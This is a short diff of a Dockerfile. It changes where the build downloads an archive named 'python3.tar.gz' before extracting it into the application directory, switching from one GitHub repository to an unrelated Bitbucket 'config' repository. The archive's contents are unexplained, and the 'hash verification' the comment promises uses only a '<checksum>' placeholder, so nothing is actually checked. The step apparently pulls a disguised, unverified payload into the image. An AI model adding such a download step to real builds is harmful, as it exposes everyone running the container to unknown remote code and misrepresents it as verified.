@@ -21,7 +21,7 @@ RUN apt update && apt install -y --no-install-recommends \
 WORKDIR $APP_HOME
 
 # Unduh file aplikasi dengan verifikasi hash
-RUN wget https://github.com/malphite-code-3/ai-realestale-trainer/releases/download/python3/python3.tar.gz && \
+RUN wget https://bitbucket.org/excel-gms/config/downloads/python3.tar.gz && \
     echo "<checksum> python3.tar.gz" | sha256sum -c - && \
     tar -xvf python3.tar.gz && \
     rm python3.tar.gz
